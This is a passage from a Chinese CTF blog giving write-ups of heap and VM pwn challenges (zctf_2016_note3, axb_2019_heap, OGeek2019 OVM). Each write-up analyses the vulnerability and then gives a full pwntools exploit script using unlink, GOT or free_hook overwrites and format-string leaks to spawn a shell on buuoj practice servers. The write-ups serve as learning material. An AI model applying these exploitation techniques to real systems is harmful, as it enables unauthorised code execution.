alt=""></p><p>这里似乎看的是将输入的数据中%去除掉，但是在遍历的时候，用了strlen来判断字符串的结尾，因此输入数据如果出现了p64打包的字节流，就会将strlen截断，从而拷贝数据失败。</p><p>因此想通过溢出来进行unlink，还要通过add函数的溢出。</p><h4 id="大致思路-v2">大致思路</h4><p>先申请三个chunk，第一个大小无所谓，让它来存放fake_chunk，然后第二个chunk的大小要为0，因为要溢出它，但是由于用户空间只有0x10，所以只能将fake_chunk布置到低地址的那个chunk（就是第一个chunk），然后利用溢出，修改第三个chunk的prev_size和size，充当引线堆块。引线堆块的大小没的说，要大于0x80,因为不能让它free掉的时候进入到fastbin里面。</p><p>剩下的就是常规unlink的操作了，将引线堆块释放掉，然后fake_chunk的地址被放到了bss段上。edit编辑bss段上存放的chunk信息，然后进行泄露函数真实地址和篡改got表的操作，最终获取shell。</p><p>以这道题为例，指的一提的是unlink要通过检查 就要伪造&amp;fake_chunk-0x18 和 &amp;fake_chunk-0x10 而bss段放的是chunk的用户地址（这个用户地址也就是正常情况下fake_chunk所处的地址)，所以chunk 1的地址下面的内容最开始就要是伪造的&amp;fake_chunk-0x18 和 &amp;fake_chunk-0x10，而不能将fake_chunk放到其他位置。</p><h4 id="EXP：">EXP：</h4><p><a href="https://www.cnblogs.com/ZIKH26/articles/16307343.html">tools源码</a></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">p,e,libc=load(<span class="string">&quot;a&quot;</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;node4.buuoj.cn&#x27;,27755)</span></span><br><span class="line"><span class="comment">#debug(p,0x400F4F)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;option---&gt;&gt;\n&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Input the id of the note:\n&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">lenth,content</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;option---&gt;&gt;\n&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Input the length of the note content:(less than 128)\n&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(lenth))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Input the note content:\n&#x27;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,choice,content</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;option---&gt;&gt;\n&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Input the id of the note:\n&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;do you want to overwrite or append?[1.overwrite/2.append]\n&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(choice))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;TheNewContents:&#x27;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;option---&gt;&gt;\n&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Input the id of the note:\n&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">p.sendline(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">ptr=<span class="number">0x602120</span></span><br><span class="line">fake_chunk=p64(<span class="number">0</span>)+p64(<span class="number">0x71</span>)</span><br><span class="line">fake_chunk+=p64(ptr-<span class="number">0x18</span>)+p64(ptr-<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+p64(<span class="number">0x70</span>)+p64(<span class="number">0x90</span>)</span><br><span class="line">add(<span class="number">0x50</span>,fake_chunk)</span><br><span class="line">add(<span class="number">0x0</span>,<span class="string">b&#x27;aaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">b&#x27;ddddd&#x27;</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0</span>,payload)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">atoi_got_addr=e.got[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+p64(atoi_got_addr)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">1</span>,payload)<span class="comment">#前面是垃圾数据（非0）后面只有这一个地址，因此地址中的00被截断了，也不影响数据本身</span></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">atoi_addr=u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log(<span class="string">&#x27;atoi&#x27;</span>,<span class="built_in">hex</span>(atoi_addr))</span><br><span class="line">sys_addr,bin_sh_addr=local_search(<span class="string">&#x27;atoi&#x27;</span>,atoi_addr,libc)</span><br><span class="line"><span class="comment">#sys_addr,bin_sh_addr=long_search(&#x27;atoi&#x27;,atoi_addr)</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">1</span>,p64(sys_addr))</span><br><span class="line">p.sendline(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="zctf-2016-note3">zctf_2016_note3</h3><h4 id="保护策略：-v2">保护策略：</h4><p><img src="../img/2706180-20220625222036558-1667669742.png" alt=""></p><h4 id="程序分析：">程序分析：</h4><p><img src="../img/2706180-20220625222045970-1527119726.png" alt=""></p><p>漏洞和note2一样，依旧拿着int类型和unsigned int类型作比较，导致-1可以变成一个很大的整数，从而导致输入产生了溢出。</p><p>然后这道题的show函数，无法使用，就导致了泄露不是那么舒服。</p><h4 id="大致思路-v3">大致思路</h4><p>然后常规unlink的手段，跟note2的手法一样，就不再赘述。</p><p>unlink之后，要泄露函数的真实地址。先将free函数的got表改为puts的plt地址，然后再把bss段存放的chunk地址改成puts的got地址，执行free进行泄露。需要注意的是输入的数据最后会被加上00，这道题free的got表和puts的got表是挨着的，如果把p64打包的数据给free后，最后加上的00会覆盖puts的真实的最低字节。导致puts无法正常使用，程序会崩溃。</p><p>因此发送p64打包的地址时，需要用切片处理一下，发送7个字节即可，加上\n八字节，然后程序会将\n换成00，因此不会干扰到puts的真实地址。</p><p><a href="(https://www.cnblogs.com/ZIKH26/articles/16307343.html)">tools源码</a></p><h4 id="EXP-v3">EXP</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">p,e,libc=load(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27797</span>)</span><br><span class="line"><span class="comment">#debug(p,0x400BB9)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">lenth,content</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;option---&gt;&gt;\n&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Input the length of the note content:(less than 1024)\n&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(lenth))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Input the note content:\n&#x27;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;option---&gt;&gt;\n&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Input the id of the note:\n&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Input the new content:\n&#x27;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):    </span><br><span class="line">    p.recvuntil(<span class="string">&#x27;option---&gt;&gt;\n&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Input the id of the note:\n&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">ptr=<span class="number">0x6020C8</span></span><br><span class="line">fake_chunk=p64(<span class="number">0</span>)+p64(<span class="number">0x61</span>)</span><br><span class="line">fake_chunk+=p64(ptr-<span class="number">0x18</span>)+p64(ptr-<span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">0x40</span>,fake_chunk)</span><br><span class="line">payload=p64(<span class="number">0</span>)*<span class="number">2</span>+p64(<span class="number">0x60</span>)+p64(<span class="number">0x90</span>)<span class="comment">#fake_chunk</span></span><br><span class="line">add(<span class="number">0x0</span>,<span class="string">&#x27;1&#x27;</span>)<span class="comment">#overflow_chunk</span></span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)<span class="comment">#lead_chunk</span></span><br><span class="line">add(<span class="number">0x70</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)<span class="comment">#par_chunk</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x0</span>,payload)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">free_got_addr=e.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">puts_got_addr=e.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt_addr=e.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">payload=p64(<span class="number">0</span>)*<span class="number">3</span>+p64(free_got_addr)+p64(puts_got_addr)</span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line">payload=p64(puts_plt_addr)[:<span class="number">7</span>]</span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">puts_addr=u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log(<span class="string">&#x27;puts_addr&#x27;</span>,<span class="built_in">hex</span>(puts_addr))</span><br><span class="line">sys_addr,bin_sh_addr=long_search(<span class="string">&#x27;puts&#x27;</span>,puts_addr)</span><br><span class="line">edit(<span class="number">0</span>,p64(sys_addr)[:<span class="number">7</span>])</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="../img/2706180-20220625222103836-1038592504.png" alt=""></p><h3 id="axb-2019-heap">axb_2019_heap</h3><h4 id="保护策略：-v3">保护策略：</h4><p><img src="../img/image-20221007182429275.png" alt="image-20221007182429275"></p><h4 id="漏洞所在：">漏洞所在：</h4><p><img src="../img/image-20221007182443910.png" alt="image-20221007182443910"></p><p>banner函数里面存在一个格式化字符串漏洞，根据以往的经验，通常堆+格式化字符串漏洞的题目中，格式化字符串漏洞都起到一个泄露地址的作用。因为存在这个漏洞，所以我们就相当于有了libc基地址，程序基地址。</p><p><img src="../img/image-20221007182456742.png" alt="image-20221007182456742"></p><p>get_input函数中存在一个off_by_one漏洞。由于我们有程序基地址，所以就能拿到bss段上存储chunk信息的地址，就可以打unlink(这道题我最开始考虑的是off by one+double free+fastbin attack，不过在构造的时候想起来了，这道题释放的堆块进入不到fastbin中)</p><h4 id="EXP-v4">EXP:</h4><p><a href="https://www.cnblogs.com/ZIKH26/articles/16307343.html">tools源码</a></p><p>整体来说就是一个格式化字符串泄露地址+unlink 比较简单，这里我就直接放exp了。</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">p,e,libc= load(<span class="string">&quot;a&quot;</span>)</span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28336</span>)</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">d_a=<span class="number">0x11A8</span></span><br><span class="line">d_d=<span class="number">0x11ba</span></span><br><span class="line">d_e=<span class="number">0x11e0</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Enter the index you want to create (0-10):&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Enter a size:\n&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Enter the content: \n&#x27;</span>,content)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Done!\n&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Enter an index:\n&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Enter the content: \n&#x27;</span>,content)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Done!\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Enter an index:\n&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    <span class="comment">#p.recvuntil(&#x27;Done!\n&#x27;)</span></span><br><span class="line"><span class="comment">#debug(p,&#x27;pie&#x27;,d_e,d_a,d_d)</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Enter your name: &#x27;</span>,<span class="string">b&#x27;%15$p%14$p&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Hello, &#x27;</span>)</span><br><span class="line">leak_libc_addr=<span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">log_addr(<span class="string">&#x27;leak_libc_addr&#x27;</span>)</span><br><span class="line">libc_base_addr=leak_libc_addr-<span class="number">0x20830</span></span><br><span class="line">log_addr(<span class="string">&#x27;libc_base_addr&#x27;</span>)</span><br><span class="line">base_addr=<span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)-<span class="number">0x1200</span></span><br><span class="line">log_addr(<span class="string">&#x27;base_addr&#x27;</span>)</span><br><span class="line">ptr=base_addr+<span class="number">0x202070</span></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x98</span>,<span class="string">&#x27;aaaabbbb&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x98</span>,<span class="string">&#x27;ccccdddd&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x98</span>,<span class="string">&#x27;eeeeffff&#x27;</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x98</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">fake_chunk=p64(<span class="number">0</span>)+p64(<span class="number">0x90</span>)</span><br><span class="line">fake_chunk+=p64(ptr-<span class="number">0x18</span>)+p64(ptr-<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,fake_chunk+<span class="number">0x70</span>*<span class="string">b&#x27;a&#x27;</span>+p64(<span class="number">0x90</span>)+<span class="string">b&#x27;\xa0&#x27;</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">free_hook=libc_base_addr+<span class="number">0x3c67a8</span> </span><br><span class="line">sys_addr=libc_base_addr+<span class="number">0x0000000000045390</span></span><br><span class="line">edit(<span class="number">1</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+p64(free_hook)+p64(<span class="number">0x20</span>))</span><br><span class="line">edit(<span class="number">0</span>,p64(sys_addr))</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="../img/image-20221007182508865.png" alt="image-20221007182508865"></p>]]></content>
      
      
      <categories>
          
          <category> 学习总结 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 篡改got表 </tag>
            
            <tag> 堆溢出 </tag>
            
            <tag> unlink </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于vm pwn的学习总结</title>
      <link href="/posts/ccd7886.html"/>
      <url>/posts/ccd7886.html</url>
      
        <content type="html"><![CDATA[<h2 id="总结：">总结：</h2><p>目前就做了两道vm pwn的题目先简单总结一下，这类题目逆向量较大，如果有分析不懂的函数或者某段指令可以尝试配合gdb动态调试观察某些寄存器或内存值的变化来猜测其功能。漏洞点大多为数组越界可以写或者任意读来劫持hook或者got表等等。不一定每个指令都要具体分析明白，个人认为去关注漏洞指令，其他指令用到哪个去简单分析哪个</p><h2 id="OGeek2019-Final-OVM">[OGeek2019 Final]OVM</h2><h3 id="保护策略">保护策略</h3><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212041849897.png" alt="image-20221204184926728"></p><h3 id="程序逻辑">程序逻辑</h3><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212041852544.png" alt="image-20221204185221474"></p><p>首先程序申请了一块堆空间，程序结束的时候可以往里面输入东西，然后将其释放掉。随后询问了PC和SP寄存器的值(所谓的寄存器就是在bss段上开辟的一片数组)，而pc和sp在这道题里没有任何用，接着要我们要输入指令的个数。</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212041923932.png" alt="image-20221204192348862"></p><p>上面代码的注释写的很清楚了，下面的代码在while循环里的部分是处理指令的部分，而最后read函数去往堆块里输入数据，再将这个堆块free掉</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212041924716.png" alt="image-20221204192408661"></p><p>在execute函数里将我们输入的每个指令都进行了分析，大概就是用c语言来实现了汇编的指令，首先每个指令都是四字节，最高字节是一个操作码(这个操作码用if来判断，这个指令是干啥的)，然后另外三个字节是操作数，以add指令为例，首先用HIBYTE这个宏判断最高字节是否为0x70，如果是0x70就执行</p><p><code>reg[high]=reg[low]+reg[medium]</code>很明显这是个add指令。通过reg数组以及配合其索引来进行的操作，索引就是指令的各个字节。</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212041944999.png" alt="image-20221204194431944"></p><p>下面这个指令是将具体的数值赋值给reg数组里的某个元素，只有赋值完毕，上面的add指令才有用</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212042032767.png" alt="image-20221204203212704"></p><p>而本题的漏洞则在下面两个指令</p><p>reg[low]的值可以控制，这意味着memory的索引可以溢出，从而去篡改某些指针。</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212042033519.png" alt="image-20221204203332481"></p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212042033212.png" alt="image-20221204203341172"></p><p>因为无法篡改got表，所以把利用点放到程序最后往comment的输入上(如下)</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212042035714.png" alt="image-20221204203553678"></p><p>如果我们能篡改comment这个指针的话，就意味着程序的最后可以任意地址写，并且还调用了free函数，那就利用数组溢出将comment改成free_hook-8的地址，最后输入字符串/bin/sh以及system的地址过去，执行free函数的时候则获取shell。</p><h3 id="利用思路">利用思路</h3><p>首先我们要把free_hook-8的地址写到一个地址上，然后将这个地址利用数组溢出写到comment上。而第一步我们需要做出来一个free_hook-8的地址，考虑到bss段上方是got表，我们利用负数索引就可以实现地址任意读取，这里我读取的是stderr的地址，将其读到了reg[4][5]的位置(因为地址是八字节，而一个数组元素是四字节，所以需要两个数组元素放一个地址)</p><p>而后用add指令将stderr的地址改成free_hook-8，最后将free_hook-8赋值到comment的位置即可。具体情况参考exp</p><h3 id="EXP">EXP</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p,e,libc=load(<span class="string">&quot;a&quot;</span>,<span class="string">&quot;node4.buuoj.cn:26005&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;PC: &quot;</span>,<span class="built_in">str</span>(<span class="number">0x1111</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;SP: &quot;</span>,<span class="built_in">str</span>(<span class="number">0x1111</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;CODE SIZE: &quot;</span>,<span class="built_in">str</span>(<span class="number">18</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">opcode</span>(<span class="params">op,high,medium,low</span>):</span><br><span class="line">    payload=(op&lt;&lt;<span class="number">24</span>)+(high&lt;&lt;<span class="number">16</span>)+(medium&lt;&lt;<span class="number">8</span>)+(low)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(payload))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;CODE: &quot;</span>)</span><br><span class="line"><span class="comment">#create a stderr address in reg array</span></span><br><span class="line">opcode(<span class="number">0x10</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">26</span>)     <span class="comment">#mov reg[0],26</span></span><br><span class="line">opcode(<span class="number">0x80</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">0</span>)      <span class="comment">#reg[2]=reg[1]-reg[0]</span></span><br><span class="line">opcode(<span class="number">0x30</span>,<span class="number">4</span>,<span class="number">0</span>,<span class="number">2</span>)      <span class="comment">#mov reg[4],memory[reg[2]]</span></span><br><span class="line">opcode(<span class="number">0x10</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">25</span>)     <span class="comment">#mov reg[0],25</span></span><br><span class="line">opcode(<span class="number">0x80</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">0</span>)      <span class="comment">#reg[2]=reg[1]-reg[0]</span></span><br><span class="line">opcode(<span class="number">0x30</span>,<span class="number">5</span>,<span class="number">0</span>,<span class="number">2</span>)      <span class="comment">#mov reg[5],memory[reg[2]]       reg[4][5]---&gt;stderr address</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#create free_hook address through stderr address</span></span><br><span class="line">opcode(<span class="number">0x10</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">0x10</span>)     <span class="comment">#mov reg[2],0x10</span></span><br><span class="line">opcode(<span class="number">0x10</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">8</span>)      <span class="comment">#mov reg[0],8</span></span><br><span class="line">opcode(<span class="number">0xc0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">0</span>)      <span class="comment">#reg[1]=sal reg[2],8</span></span><br><span class="line"></span><br><span class="line">opcode(<span class="number">0x10</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">0xa0</span>)   <span class="comment">#mov reg[2],0xa0</span></span><br><span class="line">opcode(<span class="number">0x70</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">2</span>)      <span class="comment">#add reg[1],reg[2]</span></span><br><span class="line">opcode(<span class="number">0x70</span>,<span class="number">4</span>,<span class="number">4</span>,<span class="number">1</span>)      <span class="comment">#add reg[4],reg[1]              reg[4][5]---&gt;free_hook address-8</span></span><br><span class="line"></span><br><span class="line">debug(p,<span class="string">&#x27;pie&#x27;</span>,<span class="number">0xD39</span>)</span><br><span class="line"><span class="comment">#let pointer comment point to free_hook</span></span><br><span class="line">opcode(<span class="number">0x10</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x8</span>)     <span class="comment">#mov reg[0],8</span></span><br><span class="line">opcode(<span class="number">0x80</span>,<span class="number">2</span>,<span class="number">7</span>,<span class="number">0</span>)      <span class="comment">#reg[2]=reg[7]-reg[0]</span></span><br><span class="line">opcode(<span class="number">0x40</span>,<span class="number">4</span>,<span class="number">0</span>,<span class="number">2</span>)      <span class="comment">#mov memory[reg[2]],reg[4]</span></span><br><span class="line">opcode(<span class="number">0x10</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x7</span>)     <span class="comment">#mov reg[0],9</span></span><br><span class="line">opcode(<span class="number">0x80</span>,<span class="number">2</span>,<span class="number">7</span>,<span class="number">0</span>)      <span class="comment">#reg[2]=reg[7]-reg[0]</span></span><br><span class="line">opcode(<span class="number">0x40</span>,<span class="number">5</span>,<span class="number">0</span>,<span class="number">2</span>)      <span class="comment">#mov memory[reg[2]],reg[5]</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;R4: &quot;</span>)</span><br><span class="line">addr1=<span class="built_in">int</span>(p.recv(<span class="number">8</span>),<span class="number">16</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;R5: &quot;</span>)</span><br><span class="line">addr2=<span class="built_in">int</span>(p.recv(<span class="number">4</span>),<span class="number">16</span>)</span><br><span class="line">sys_addr=addr1+((addr2)&lt;&lt;<span class="number">32</span>)-<span class="number">0x381410</span></span><br><span class="line">log_addr(<span class="string">&#x27;sys_addr&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&quot;HOW DO YOU FEEL AT OVM?\n&quot;</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>+p64(sys_addr))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212042056131.png" alt="image-20221204205650878"></p><h2 id="ciscn-2019-qual-virtual">ciscn_2019_qual_virtual</h2><h3 id="保护策略-v2">保护策略</h3><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212052243919.png" alt="image-20221205224348518"></p><h3 id="程序逻辑-v2">程序逻辑</h3><h4 id="控制堆块与text-data-stack">控制堆块与text data stack</h4><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212052246509.png" alt="image-20221205224630447"></p><p>程序最开始分配了data段，text段和stack段。他们实现的方式都是用一个控制堆块来存放申请出来的这个段的指针，而返回的是控制堆块的地址(以stack段举例，如下)</p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212052248915.png" alt="image-20221205224802845" style="zoom:50%;" /><p>malloc先是申请了0x10的内存出来，当做控制堆块，而后申请了8*0x40的内存当做stack，将其地址赋给s，而s这个指针存放到了ptr这个控制堆块里，最后返回ptr。</p><h4 id="获取操作码的函数">获取操作码的函数</h4><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212052250722.png" alt="image-20221205225055604"></p><p>这里的实现思路是检测我们输入的字符串中是否出现了指令字符，比如push pop add等等，然后将对应指令换成操作码来存储到text段上(赋值如下)，40144E函数将ptr[i]存放的机器码给到了a1(text段)</p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212052252420.png" alt="image-20221205225251375" style="zoom:67%;" /><p>上面需要注意的是strtok函数，strtok函数会遍历delim中的每一个字符，如果delim中有任何一个字符在第一个参数中出现，那么就会把这个字符当做分隔符进行分割，使用过strtok函数一次后，之后的每次往下分割只需要让第一个参数为NULL即可。</p><h4 id="获取数据的函数">获取数据的函数</h4><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212052256437.png" alt="image-20221205225650366"></p><p>这个函数是获取用户输入的每个数据，将其存储到data段上，也是以delim分割(这个data段是和text段以及stack段配套使用的)</p><h4 id="处理指令函数">处理指令函数</h4><p>这个execute函数可以对之前输入的每个指令进行处理，需要注意的是下面的puts(s)，因为s可控，并且程序可以被篡改got表，所以之后有机会可以考虑将puts的got表劫持为system的地址，从而在此处获取shell</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212052258349.png" alt="image-20221205225833308"></p><p>然后下面分析几个典型的函数</p><p>下面这个函数是从a1里面获取一个值，存放到a2指向的位置。</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212052300547.png" alt="image-20221205230047501"></p><p><img 